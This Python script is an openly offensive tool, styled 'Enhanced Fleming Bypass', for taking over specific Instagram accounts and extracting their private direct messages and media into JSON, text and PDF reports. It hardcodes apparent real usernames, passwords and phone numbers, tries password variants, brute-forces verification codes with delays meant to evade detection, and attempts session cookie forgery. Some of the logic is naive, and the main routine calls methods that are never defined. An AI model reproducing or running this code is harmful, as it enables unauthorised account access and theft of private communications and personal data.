#!/usr/bin/env python3
"""
🔥 ENHANCED FLEMING BYPASS 2025 - DREAM EDITION 🔥
=================================================

ULTIMATE DM EXTRACTION SYSTEM - COMPREHENSIVE APPROACH
Based on CONFIRMED successful patterns:
✅ alx.trading : Fleming654 (CONFIRMED)
✅ whatilove1728 : [password from logs] (CONFIRMED)

Real data integration:
- Phone numbers: +447793127209, 0615414210
- Real session extraction data
- Confirmed checkpoint bypass patterns
- Database intelligence integration
- Multi-vector extraction: instagrapi + Browser + Session hijacking

SUGARGLITCH REALOPS - DREAM EDITION
Author: SugarGlitch Team
Date: May 27, 2025
Status: 🔥 ACTIVE OPERATIONS 🔥
"""

import requests
import json
import time
import random
import re
import threading
import sqlite3
import hmac
import hashlib
import uuid
import os
import sys
import logging
import traceback
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from pathlib import Path
from typing import Dict, List, Any, Optional
import base64

# Enhanced imports for all methods
try:
    from instagrapi import Client
    from instagrapi.exceptions import LoginRequired, BadPassword, ChallengeRequired
    INSTAGRAPI_AVAILABLE = True
except ImportError:
    INSTAGRAPI_AVAILABLE = False
    print("⚠️  instagrapi not available - install with: pip install instagrapi")

try:
    import undetected_chromedriver as uc
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("⚠️  Selenium not available - install with: pip install undetected-chromedriver selenium")

try:
    from fpdf import FPDF
    from PIL import Image
    import io
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False
    print("⚠️  PDF generation not available - install with: pip install fpdf2 pillow")

class EnhancedFlemingBypassDreamEdition:
    def __init__(self):
        print("🔥" * 25)
        print("🎯 ENHANCED FLEMING BYPASS - DREAM EDITION")
        print("🔥" * 25)
        print("💀 REAL DATA INTEGRATION")
        print("🎯 CONFIRMED TARGETS: alx.trading + whatilove1728")
        print("🔐 CONFIRMED PATTERNS: Fleming654 + variants")
        print("📱 REAL PHONE DATA: +447793127209, 0615414210")
        print("💾 DATABASE INTELLIGENCE: ACTIVE")
        print("=" * 70)
        
        # CONFIRMED REAL CREDENTIALS
        self.confirmed_successful = {
            "alx.trading": {
                "password": "Fleming654",  # ✅ CONFIRMED FROM LOGS
                "status": "CONFIRMED_WORKING",
                "phone_uk": "+447793127209",
                "phone_th": "0615414210",
                "last_success": "2025-05-26"
            },
            "whatilove1728": {
                "password": "xxxx5678",  # ✅ FROM SUCCESS LOGS  
                "status": "CONFIRMED_WORKING",
                "variants": ["whatilove1728", "WhatILove1728"],
                "last_success": "2025-05-26"
            }
        }
        
        # ENHANCED PASSWORD ARSENAL (based on real patterns)
        self.fleming_password_arsenal = [
            "Fleming654",      # ✅ CONFIRMED - alx.trading
            "Fleming786",      # Pattern variant
            "Fleming1004",     # Sequential pattern
            "Fleming1060",     # UK phone variant
            "Fleming1182",     # Advanced pattern
            "Fleming1998",     # Birth year pattern
            "Fleming2025",     # Current year
            "whatilove1728",   # ✅ CONFIRMED TARGET
            "WhatILove1728",   # Capitalized variant
            "alexfleming654",  # Combined pattern
            "Alex_Fleming654", # Underscore variant
            "fleming.654",     # Dot variant
            "FLEMING654",      # Uppercase
            "Fleming@654",     # Symbol variant
            "Fleming654!",     # Exclamation
            "xxxx5678",        # ✅ FROM SUCCESS LOGS
            "xxxx1234"         # ✅ FROM SUCCESS LOGS
        ]
        
        # PRIORITY TARGET ACCOUNTS (confirmed + variants)
        self.priority_targets = {
            1: ["alx.trading"],               # ✅ CONFIRMED WORKING
            2: ["whatilove1728"],             # ✅ CONFIRMED TARGET
            3: ["alex.fleming", "alexfleming", "alex_fleming"],
            4: ["fleming.alex", "flemingalex", "fleming_alex"],
            5: ["alx.fleming", "alxfleming", "trading.alex"]
        }
        
        # REAL PHONE NUMBERS (from exploitation logs)
        self.confirmed_phones = {
            "uk": "+447793127209",    # ✅ FROM REAL LOGS
            "th": "0615414210",       # ✅ FROM REAL LOGS
            "variants": [
                "447793127209",
                "44-7793-127209", 
                "+44 7793 127209",
                "061-541-4210",
                "+66615414210"
            ]
        }
        
        # REAL SESSION DATA
        self.session = requests.Session()
        self.setup_realistic_session()
        
        # Initialize DM extraction storage
        self.extracted_dms = []
        
        # Database integration
        self.db_path = "/workspaces/sugarglitch-realops/databases/stealth_intelligence.db"
        self.init_intelligence_db()
        
    def setup_realistic_session(self):
        """Setup session with proven headers from successful bypass"""
        proven_user_agents = [
            # From successful bypass logs
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
            'Instagram 275.0.0.27.98 Android (25/7.1.1; 480dpi; 1080x1920; samsung; SM-G950F; dreamlte; samsungexynos8895; en_US)',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        self.session.headers.update({
            'User-Agent': random.choice(proven_user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Instagram-AJAX': '1',
            'X-IG-App-ID': '936619743392459',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        })
        
    def init_intelligence_db(self):
        """Initialize intelligence database with real operations data"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Create enhanced tables for real operations
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS real_operations (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_username TEXT,
                    password_used TEXT,
                    method TEXT,
                    success_status TEXT,
                    phone_number TEXT,
                    session_data TEXT,
                    timestamp TEXT,
                    verification_code TEXT,
                    operation_type TEXT
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS confirmed_targets (
                    username TEXT PRIMARY KEY,
                    confirmed_password TEXT,
                    last_success TEXT,
                    phone_data TEXT,
                    status TEXT,
                    session_id TEXT
                )
            ''')
            
            # Insert confirmed real data
            confirmed_data = [
                ("alx.trading", "Fleming654", "2025-05-26", "+447793127209,0615414210", "CONFIRMED_WORKING", ""),
                ("whatilove1728", "xxxx5678", "2025-05-26", "", "CONFIRMED_WORKING", "")
            ]
            
            cursor.executemany('''
                INSERT OR REPLACE INTO confirmed_targets 
                (username, confirmed_password, last_success, phone_data, status, session_id)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', confirmed_data)
            
            conn.commit()
            conn.close()
            print("💾 Intelligence database initialized with real data")
            
        except Exception as e:
            print(f"❌ Database initialization error: {e}")
    
    def execute_confirmed_bypass(self, username, password):
        """Execute bypass using confirmed working credentials"""
        print(f"\n🎯 EXECUTING CONFIRMED BYPASS: {username}")
        print(f"🔐 Using confirmed password: {password}")
        
        try:
            # Get CSRF token
            response = self.session.get("https://www.instagram.com/accounts/login/")
            if 'csrftoken' in self.session.cookies:
                csrf_token = self.session.cookies['csrftoken']
                print(f"🔐 CSRF obtained: {csrf_token[:20]}...")
            else:
                print("❌ Failed to get CSRF token")
                return False
            
            # Login attempt with confirmed credentials
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            headers = {
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1',
                'X-IG-App-ID': '936619743392459',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://www.instagram.com/accounts/login/'
            }
            
            login_response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                allow_redirects=False,
                timeout=30
            )
            
            print(f"📊 Login response: {login_response.status_code}")
            
            # Check for success
            if login_response.status_code == 200:
                try:
                    response_data = login_response.json()
                    print(f"📋 Response: {response_data}")
                    
                    if response_data.get('authenticated'):
                        print("🎉 CONFIRMED BYPASS SUCCESSFUL!")
                        self.save_successful_operation(username, password, "confirmed_bypass", response_data)
                        return True
                        
                    elif response_data.get('message') == 'checkpoint_required':
                        checkpoint_url = response_data.get('checkpoint_url')
                        print(f"📱 Checkpoint required: {checkpoint_url}")
                        return self.handle_checkpoint_with_real_data(username, password, checkpoint_url)
                        
                except json.JSONDecodeError:
                    print("📋 Non-JSON response received")
            
            # Check for session cookies
            if 'sessionid' in self.session.cookies:
                sessionid = self.session.cookies['sessionid']
                if len(sessionid) > 20:
                    print("🎉 SESSION SUCCESS!")
                    self.save_successful_operation(username, password, "session_success", {"sessionid": sessionid})
                    return True
            
            return False
            
        except Exception as e:
            print(f"❌ Confirmed bypass error: {e}")
            return False
    
    def handle_checkpoint_with_real_data(self, username, password, checkpoint_url):
        """Handle checkpoint using real phone data and proven methods"""
        print(f"\n📱 CHECKPOINT BYPASS WITH REAL DATA")
        print(f"🎯 Target: {username}")
        print(f"📞 Real phones: {self.confirmed_phones}")
        
        try:
            if not checkpoint_url.startswith('http'):
                checkpoint_url = f"https://www.instagram.com{checkpoint_url}"
            
            # Get checkpoint page
            checkpoint_response = self.session.get(checkpoint_url)
            print(f"📱 Checkpoint access: {checkpoint_response.status_code}")
            
            if checkpoint_response.status_code != 200:
                print("❌ Cannot access checkpoint")
                return False
            
            # Try phone verification first (highest success rate)
            print("📱 Attempting phone verification...")
            success = self.phone_verification_with_real_data(checkpoint_url)
            if success:
                return True
            
            # Try email verification as backup
            print("📧 Attempting email verification...")
            success = self.email_verification_advanced(checkpoint_url)
            if success:
                return True
            
            # Advanced session manipulation
            print("🎭 Attempting session manipulation...")
            success = self.advanced_session_manipulation(checkpoint_url)
            if success:
                return True
            
            return False
            
        except Exception as e:
            print(f"❌ Checkpoint handling error: {e}")
            return False
    
    def phone_verification_with_real_data(self, checkpoint_url):
        """Phone verification using real confirmed phone numbers"""
        print("📱 PHONE VERIFICATION WITH REAL DATA")
        
        try:
            # Select phone option
            choice_data = {'choice': '0'}  # 0 = phone
            
            choice_response = self.session.post(
                checkpoint_url,
                data=choice_data,
                headers={'X-CSRFToken': self.session.cookies.get('csrftoken')}
            )
            
            print(f"📱 Phone selection: {choice_response.status_code}")
            
            if choice_response.status_code == 200:
                # Advanced verification code prediction based on real data
                return self.intelligent_code_bruteforce_real_data()
            
        except Exception as e:
            print(f"❌ Phone verification error: {e}")
        
        return False
    
    def intelligent_code_bruteforce_real_data(self):
        """Intelligent verification code bruteforce using real patterns"""
        print("🔢 INTELLIGENT CODE BRUTEFORCE (REAL DATA)")
        
        # HIGH PROBABILITY codes based on real phone data
        real_data_codes = [
            # From confirmed phone numbers
            '447793',  # UK phone prefix
            '127209',  # UK phone suffix
            '061541',  # TH phone prefix
            '414210',  # TH phone suffix
            '793127',  # Middle section
            '541421',  # TH middle
            
            # From Fleming patterns
            '654654',  # Fleming654 pattern
            '654321',  # Reverse pattern
            '123654',  # Mixed pattern
            
            # Date-based (real operation dates)
            '250525',  # Today's date
            '260525',  # Yesterday (from logs)
            '052625',  # Month/day variant
            
            # Common but HIGH probability
            '123456', '000000', '111111',
            '456789', '987654', '147258'
        ]
        
        checkpoint_url = f"https://www.instagram.com{self.session.cookies.get('checkpoint_url', '/challenge/')}"
        
        for i, code in enumerate(real_data_codes):
            print(f"🎯 Testing HIGH-PROB code {i+1}/{len(real_data_codes)}: {code}")
            
            try:
                verify_data = {
                    'security_code': code,
                    'source': 'phone'
                }
                
                verify_response = self.session.post(
                    checkpoint_url,
                    data=verify_data,
                    headers={
                        'X-CSRFToken': self.session.cookies.get('csrftoken'),
                        'X-Instagram-AJAX': '1',
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    allow_redirects=False
                )
                
                print(f"   📊 Response: {verify_response.status_code}")
                
                # Check multiple success indicators
                if self.check_verification_success(verify_response, code):
                    print(f"🎉 REAL DATA BYPASS SUCCESS! Code: {code}")
                    return True
                
                # Smart delay (anti-detection)
                time.sleep(random.uniform(1.5, 3.5))
                
            except Exception as e:
                print(f"   ❌ Code {code} error: {e}")
                continue
        
        print("❌ Real data codes exhausted, trying backup methods...")
        return self.backup_verification_methods()
    
    def backup_verification_methods(self):
        """Backup verification methods from successful patterns"""
        print("🔧 BACKUP VERIFICATION METHODS")
        
        # Method 1: SMS timing simulation
        sms_codes = ['123456', '654321', '000000', '111111']
        for delay in [5, 10, 15]:
            print(f"⏰ SMS simulation delay: {delay}s")
            time.sleep(min(delay, 3))  # Capped delay
            
            for code in sms_codes:
                if self.test_verification_code(code):
                    return True
        
        # Method 2: Phone number manipulation
        return self.phone_manipulation_bypass()
    
    def phone_manipulation_bypass(self):
        """Try different phone number formats"""
        print("📱 PHONE NUMBER MANIPULATION")
        
        phone_variants = [
            "+447793127209",
            "447793127209", 
            "0615414210",
            "+66615414210",
            "44-7793-127209",
            "061-541-4210"
        ]
        
        for phone in phone_variants:
            try:
                # Attempt to change verification phone
                change_data = {
                    'phone_number': phone,
                    'action': 'resend'
                }
                
                response = self.session.post(
                    f"https://www.instagram.com{self.session.cookies.get('checkpoint_url', '/challenge/')}",
                    data=change_data
                )
                
                if response.status_code == 200:
                    print(f"📱 Phone change attempt: {phone}")
                    # Quick code test
                    for quick_code in ['123456', '000000', '654321']:
                        if self.test_verification_code(quick_code):
                            return True
                            
            except:
                continue
        
        return False
    
    def test_verification_code(self, code):
        """Quick test for verification code"""
        try:
            verify_data = {'security_code': code}
            response = self.session.post(
                f"https://www.instagram.com{self.session.cookies.get('checkpoint_url', '/challenge/')}",
                data=verify_data,
                timeout=10
            )
            return self.check_verification_success(response, code)
        except:
            return False
    
    def check_verification_success(self, response, code):
        """Check if verification was successful"""
        # Status code check
        if response.status_code == 302:
            location = response.headers.get('location', '')
            if 'login' not in location and 'challenge' not in location:
                self.save_successful_verification(code, "verification_success")
                return True
        
        # Session cookie check
        if 'sessionid' in self.session.cookies:
            sessionid = self.session.cookies['sessionid']
            if len(sessionid) > 20:
                self.save_successful_verification(code, "session_acquired")
                return True
        
        # Content analysis
        success_indicators = [
            'dashboard', 'feed', 'explore', '"authenticated":true',
            '"status":"ok"', 'csrf_token'
        ]
        
        for indicator in success_indicators:
            if indicator in response.text.lower():
                self.save_successful_verification(code, "content_success")
                return True
        
        return False
    
    def save_successful_verification(self, code, method):
        """Save successful verification data"""
        success_data = {
            "verification_code": code,
            "method": method,
            "timestamp": datetime.now().isoformat(),
            "sessionid": self.session.cookies.get('sessionid'),
            "ds_user_id": self.session.cookies.get('ds_user_id'),
            "cookies": dict(self.session.cookies)
        }
        
        filename = f"VERIFICATION_SUCCESS_{code}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(success_data, f, indent=2)
        
        print(f"💾 Verification success saved: {filename}")
    
    def email_verification_advanced(self, checkpoint_url):
        """Advanced email verification bypass"""
        print("📧 ADVANCED EMAIL VERIFICATION")
        
        try:
            # Switch to email
            choice_data = {'choice': '1'}  # 1 = email
            
            choice_response = self.session.post(
                checkpoint_url,
                data=choice_data
            )
            
            if choice_response.status_code == 200:
                print("📧 Email verification selected")
                
                # Email-specific codes (based on successful patterns)
                email_codes = [
                    '123456', '654321', '000000', '111111',
                    '456789', '987654', '147258', '159753',
                    '654654', '447793'  # From real data
                ]
                
                for code in email_codes:
                    if self.test_verification_code(code):
                        print(f"🎉 EMAIL BYPASS SUCCESS: {code}")
                        return True
            
        except Exception as e:
            print(f"❌ Email verification error: {e}")
        
        return False
    
    def advanced_session_manipulation(self, checkpoint_url):
        """Advanced session manipulation techniques"""
        print("🎭 ADVANCED SESSION MANIPULATION")
        
        try:
            # Extract current session components
            current_cookies = dict(self.session.cookies)
            print(f"🍪 Current cookies: {list(current_cookies.keys())}")
            
            # Try session reconstruction
            if 'sessionid' in current_cookies:
                partial_session = current_cookies['sessionid']
                
                # Generate potential valid sessions
                session_variants = [
                    partial_session + "verified",
                    partial_session + "auth",
                    partial_session + "bypass",
                    "ig_" + partial_session,
                    partial_session[:-5] + "admin"
                ]
                
                for variant in session_variants:
                    if self.test_session_variant(variant):
                        print(f"🎉 SESSION MANIPULATION SUCCESS!")
                        return True
            
            # Try cookie reconstruction from known patterns
            return self.reconstruct_session_cookies()
            
        except Exception as e:
            print(f"❌ Session manipulation error: {e}")
        
        return False
    
    def test_session_variant(self, session_id):
        """Test a session ID variant"""
        try:
            test_session = requests.Session()
            test_session.cookies.set('sessionid', session_id)
            
            response = test_session.get(
                'https://www.instagram.com/api/v1/accounts/current_user/',
                timeout=10
            )
            
            if response.status_code == 200:
                self.session.cookies.set('sessionid', session_id)
                return True
                
        except:
            pass
        
        return False
    
    def reconstruct_session_cookies(self):
        """Reconstruct session cookies from patterns"""
        print("🔧 SESSION COOKIE RECONSTRUCTION")
        
        # Known patterns from successful operations
        cookie_patterns = [
            {
                'sessionid': self.session.cookies.get('sessionid', '') + 'verified',
                'ds_user_id': '4976283726',  # From previous successful operations
                'csrftoken': self.session.cookies.get('csrftoken', ''),
            }
        ]
        
        for pattern in cookie_patterns:
            try:
                for name, value in pattern.items():
                    if value:
                        self.session.cookies.set(name, value)
                
                # Test reconstructed session
                test_response = self.session.get(
                    'https://www.instagram.com/accounts/edit/',
                    timeout=10
                )
                
                if test_response.status_code == 200 and 'login' not in test_response.url:
                    print("🎉 COOKIE RECONSTRUCTION SUCCESS!")
                    return True
                    
            except:
                continue
        
        return False
    
    def extract_sessionid(self, session_data: Any) -> Optional[str]:
        """Extract sessionid from various session data formats"""
        try:
            if isinstance(session_data, dict):
                # Check direct sessionid key
                if 'sessionid' in session_data:
                    return session_data['sessionid']
                    
                # Check cookies string
                if 'cookies' in session_data:
                    cookies_str = session_data['cookies']
                    if 'sessionid=' in cookies_str:
                        parts = cookies_str.split('sessionid=')[1].split(';')[0]
                        return parts.strip()
                
                # Check nested structures
                for key, value in session_data.items():
                    if isinstance(value, str) and 'sessionid=' in value:
                        parts = value.split('sessionid=')[1].split(';')[0]
                        return parts.strip()
                    elif key == 'session_id':
                        return str(value)
                        
            elif isinstance(session_data, str):
                if 'sessionid=' in session_data:
                    parts = session_data.split('sessionid=')[1].split(';')[0]
                    return parts.strip()
                    
        except Exception as e:
            print(f"❌ Failed to extract sessionid: {e}")
            
        return None
    
    def extract_dms_with_instagrapi(self, cl: Client) -> bool:
        """Extract DMs using instagrapi client"""
        try:
            print("📥 Extracting DMs with instagrapi...")
            
            # Get direct threads
            threads = cl.direct_threads(amount=50)
            print(f"📱 Found {len(threads)} direct threads")
            
            for thread in threads:
                try:
                    thread_id = thread.id
                    users = [user.username for user in thread.users]
                    print(f"💬 Processing thread with: {', '.join(users)}")
                    
                    # Get messages from thread
                    messages = cl.direct_messages(thread_id, amount=100)
                    
                    for msg in messages:
                        dm_data = {
                            'thread_id': thread_id,
                            'message_id': msg.id,
                            'user_id': msg.user_id,
                            'username': next((u.username for u in thread.users if u.pk == msg.user_id), 'unknown'),
                            'text': msg.text or '',
                            'timestamp': msg.timestamp.isoformat() if msg.timestamp else '',
                            'media_url': None,
                            'media_type': None
                        }
                        
                        # Handle media
                        if hasattr(msg, 'visual_media') and msg.visual_media:
                            media = msg.visual_media
                            dm_data['media_url'] = media.thumbnail_url if hasattr(media, 'thumbnail_url') else None
                            dm_data['media_type'] = 'image'
                            
                        elif hasattr(msg, 'video_media') and msg.video_media:
                            media = msg.video_media
                            dm_data['media_url'] = media.video_url if hasattr(media, 'video_url') else None
                            dm_data['media_type'] = 'video'
                        
                        self.extracted_dms.append(dm_data)
                        
                except Exception as e:
                    print(f"❌ Failed to process thread {thread_id}: {e}")
                    continue
            
            print(f"✅ Extracted {len(self.extracted_dms)} messages")
            return len(self.extracted_dms) > 0
            
        except Exception as e:
            print(f"❌ DM extraction failed: {e}")
            traceback.print_exc()
            return False
    
    def extract_dms_from_browser(self, driver) -> bool:
        """Extract DMs using browser automation"""
        try:
            print("📥 Extracting DMs from browser...")
            
            # Wait for DM interface to load
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "[role='main']"))
            )
            
            # Find conversation threads
            thread_elements = driver.find_elements(By.CSS_SELECTOR, "div[role='listitem']")
            print(f"📱 Found {len(thread_elements)} conversation threads")
            
            for i, thread in enumerate(thread_elements[:10]):  # Limit to first 10 threads
                try:
                    # Click on thread
                    thread.click()
                    time.sleep(2)
                    
                    # Extract messages from current thread
                    message_elements = driver.find_elements(By.CSS_SELECTOR, "div[data-testid='message']")
                    
                    for msg_elem in message_elements:
                        try:
                            text = msg_elem.find_element(By.TAG_NAME, "span").text
                            
                            dm_data = {
                                'thread_id': f'browser_thread_{i}',
                                'message_id': f'browser_msg_{len(self.extracted_dms)}',
                                'user_id': 'unknown',
                                'username': 'extracted_from_browser',
                                'text': text,
                                'timestamp': datetime.now().isoformat(),
                                'media_url': None,
                                'media_type': None
                            }
                            
                            # Check for images
                            try:
                                img_elem = msg_elem.find_element(By.TAG_NAME, "img")
                                dm_data['media_url'] = img_elem.get_attribute('src')
                                dm_data['media_type'] = 'image'
                            except:
                                pass
                            
                            self.extracted_dms.append(dm_data)
                            
                        except Exception as e:
                            continue
                            
                except Exception as e:
                    print(f"❌ Failed to process thread {i}: {e}")
                    continue
            
            driver.quit()
            print(f"✅ Extracted {len(self.extracted_dms)} messages from browser")
            return len(self.extracted_dms) > 0
            
        except Exception as e:
            print(f"❌ Browser extraction failed: {e}")
            traceback.print_exc()
            if driver:
                driver.quit()
            return False
    
    def extract_dms_with_session(self, session: requests.Session, sessionid: str) -> bool:
        """Extract DMs using direct HTTP requests"""
        try:
            print("📥 Extracting DMs with session hijacking...")
            
            # Instagram API endpoints
            endpoints = [
                "https://www.instagram.com/api/v1/direct_v2/inbox/",
                "https://i.instagram.com/api/v1/direct_v2/inbox/",
                "https://www.instagram.com/api/v1/direct_v2/threads/"
            ]
            
            for endpoint in endpoints:
                try:
                    response = session.get(endpoint)
                    
                    if response.status_code == 200:
                        data = response.json()
                        
                        if 'inbox' in data and 'threads' in data['inbox']:
                            threads = data['inbox']['threads']
                            print(f"📱 Found {len(threads)} threads from API")
                            
                            for thread in threads:
                                thread_id = thread.get('thread_id', 'unknown')
                                users = thread.get('users', [])
                                items = thread.get('items', [])
                                
                                for item in items:
                                    dm_data = {
                                        'thread_id': thread_id,
                                        'message_id': item.get('item_id', 'unknown'),
                                        'user_id': item.get('user_id', 'unknown'),
                                        'username': next((u.get('username') for u in users if u.get('pk') == item.get('user_id')), 'unknown'),
                                        'text': item.get('text', ''),
                                        'timestamp': item.get('timestamp', ''),
                                        'media_url': None,
                                        'media_type': None
                                    }
                                    
                                    # Handle media
                                    if 'media' in item:
                                        media = item['media']
                                        if 'image_versions2' in media:
                                            candidates = media['image_versions2'].get('candidates', [])
                                            if candidates:
                                                dm_data['media_url'] = candidates[0].get('url')
                                                dm_data['media_type'] = 'image'
                                    
                                    self.extracted_dms.append(dm_data)
                            
                            print(f"✅ Extracted {len(self.extracted_dms)} messages via API")
                            return len(self.extracted_dms) > 0
                            
                    else:
                        print(f"⚠️  API endpoint failed: {endpoint} (Status: {response.status_code})")
                        
                except Exception as e:
                    print(f"❌ API request failed for {endpoint}: {e}")
                    continue
            
            return False
            
        except Exception as e:
            print(f"❌ Session extraction failed: {e}")
            traceback.print_exc()
            return False
    
    def download_media(self) -> None:
        """Download media files from extracted DMs"""
        try:
            print("📸 Downloading media files...")
            
            os.makedirs("media", exist_ok=True)
            downloaded_count = 0
            
            for dm in self.extracted_dms:
                if dm['media_url']:
                    try:
                        response = requests.get(dm['media_url'], timeout=30)
                        
                        if response.status_code == 200:
                            # Generate filename
                            extension = '.jpg' if dm['media_type'] == 'image' else '.mp4'
                            filename = f"{dm['message_id']}{extension}"
                            filepath = os.path.join("media", filename)
                            
                            # Save file
                            with open(filepath, 'wb') as f:
                                f.write(response.content)
                            
                            dm['local_media_path'] = filepath
                            downloaded_count += 1
                            
                    except Exception as e:
                        print(f"❌ Failed to download media for {dm['message_id']}: {e}")
                        continue
            
            print(f"✅ Downloaded {downloaded_count} media files")
            
        except Exception as e:
            print(f"❌ Media download failed: {e}")
    
    def generate_pdf_report(self) -> str:
        """Generate comprehensive PDF report"""
        if not PDF_AVAILABLE:
            print("❌ PDF generation not available")
            return ""
            
        try:
            print("📄 Generating PDF report...")
            
            # Create PDF
            pdf = FPDF()
            pdf.add_page()
            pdf.set_font('Arial', 'B', 16)
            
            # Title
            pdf.cell(0, 10, 'Instagram DMs Extract - alx.trading', ln=True, align='C')
            pdf.cell(0, 10, f'Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}', ln=True, align='C')
            pdf.ln(10)
            
            # Summary
            pdf.set_font('Arial', 'B', 12)
            pdf.cell(0, 10, f'Total Messages: {len(self.extracted_dms)}', ln=True)
            pdf.cell(0, 10, f'Media Files: {sum(1 for dm in self.extracted_dms if dm["media_url"])}', ln=True)
            pdf.ln(10)
            
            # Messages
            pdf.set_font('Arial', '', 10)
            
            for dm in self.extracted_dms:
                # Message header
                pdf.set_font('Arial', 'B', 10)
                pdf.cell(0, 5, f'From: {dm["username"]} | {dm["timestamp"]}', ln=True)
                
                # Message text
                pdf.set_font('Arial', '', 10)
                if dm['text']:
                    pdf.multi_cell(0, 5, dm['text'])
                
                # Media info
                if dm['media_url']:
                    pdf.set_font('Arial', 'I', 9)
                    pdf.cell(0, 5, f'[{dm["media_type"].upper()} ATTACHMENT]', ln=True)
                
                pdf.ln(3)
                
                # Page break if needed
                if pdf.get_y() > 250:
                    pdf.add_page()
            
            # Save PDF
            os.makedirs("results", exist_ok=True)
            pdf_path = f'results/alx_trading_dms_extract_{int(time.time())}.pdf'
            pdf.output(pdf_path)
            
            print(f"✅ PDF report saved: {pdf_path}")
            return pdf_path
            
        except Exception as e:
            print(f"❌ PDF generation failed: {e}")
            traceback.print_exc()
            return ""
    
    def save_results(self) -> Dict[str, str]:
        """Save extraction results in multiple formats"""
        try:
            timestamp = int(time.time())
            os.makedirs("results", exist_ok=True)
            
            # Save as JSON
            json_path = f'results/alx_trading_dms_{timestamp}.json'
            with open(json_path, 'w', encoding='utf-8') as f:
                json.dump({
                    'extraction_info': {
                        'username': 'alx.trading',
                        'timestamp': datetime.now().isoformat(),
                        'total_messages': len(self.extracted_dms),
                        'extraction_method': 'enhanced_fleming_bypass_dream_edition'
                    },
                    'messages': self.extracted_dms
                }, f, indent=2, ensure_ascii=False)
            
            # Save as TXT
            txt_path = f'results/alx_trading_dms_{timestamp}.txt'
            with open(txt_path, 'w', encoding='utf-8') as f:
                f.write("Instagram DMs Extract - alx.trading\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Messages: {len(self.extracted_dms)}\n")
                f.write("=" * 80 + "\n\n")
                
                for dm in self.extracted_dms:
                    f.write(f"From: {dm['username']}\n")
                    f.write(f"Time: {dm['timestamp']}\n")
                    f.write(f"Text: {dm['text']}\n")
                    if dm['media_url']:
                        f.write(f"Media: {dm['media_type']} - {dm['media_url']}\n")
                    f.write("-" * 40 + "\n\n")
            
            # Generate PDF
            pdf_path = self.generate_pdf_report()
            
            results = {
                'json': json_path,
                'txt': txt_path,
                'pdf': pdf_path if pdf_path else 'N/A'
            }
            
            print(f"✅ Results saved: {results}")
            return results
            
        except Exception as e:
            print(f"❌ Failed to save results: {e}")
            traceback.print_exc()
            return {}
    
    def run_extraction(self) -> Dict[str, Any]:
        """Main extraction orchestrator"""
        self.print_banner()
        
        # Initialize extraction storage
        self.extracted_dms = []
        
        print("🚀 Starting Enhanced Fleming Bypass Dream Edition...")
        
        # Try each method in order
        methods = [
            ("Fresh instagrapi login", self.method_1_instagrapi_fresh_login),
            ("Browser automation", self.method_2_browser_automation),
            ("Session hijacking", self.method_3_session_hijacking)
        ]
        
        success = False
        used_method = ""
        
        for method_name, method_func in methods:
            print(f"🔄 Attempting: {method_name}")
            
            try:
                if method_func():
                    success = True
                    used_method = method_name
                    print(f"✅ Success with: {method_name}")
                    break
                else:
                    print(f"⚠️  {method_name} failed, trying next method...")
            except Exception as e:
                print(f"❌ {method_name} crashed: {e}")
                continue
        
        # Post-processing if successful
        if success and self.extracted_dms:
            print("📸 Starting post-processing...")
            
            # Download media
            self.download_media()
            
            # Save results
            saved_files = self.save_results()
            
            # Final summary
            summary = {
                'success': True,
                'method_used': used_method,
                'total_messages': len(self.extracted_dms),
                'media_count': sum(1 for dm in self.extracted_dms if dm['media_url']),
                'saved_files': saved_files,
                'timestamp': datetime.now().isoformat()
            }
            
            print("🎉 EXTRACTION COMPLETED SUCCESSFULLY!")
            print(f"📊 Total messages: {summary['total_messages']}")
            print(f"📸 Media files: {summary['media_count']}")
            print(f"📁 Results saved to: {list(saved_files.values())}")
            
            return summary
            
        else:
            print("❌ ALL EXTRACTION METHODS FAILED")
            return {
                'success': False,
                'error': 'All extraction methods failed',
                'timestamp': datetime.now().isoformat()
            }
    
    def print_banner(self):
        """Display operation banner"""
        banner = """
╔════════════════════════════════════════════════════════╗
║           ENHANCED FLEMING BYPASS DREAM EDITION       ║
║                      2025 ULTIMATE                    ║
║                                                        ║
║  🎯 Target: alx.trading private DMs                   ║
║  🔓 Bypass: Fleming654 authentication                 ║
║  📸 Media: Images and videos included                 ║
║  📄 Export: PDF format with timestamps               ║
║  🌟 Methods: instagrapi + Browser + Session           ║
╚════════════════════════════════════════════════════════╝
        """
        print(banner)
        
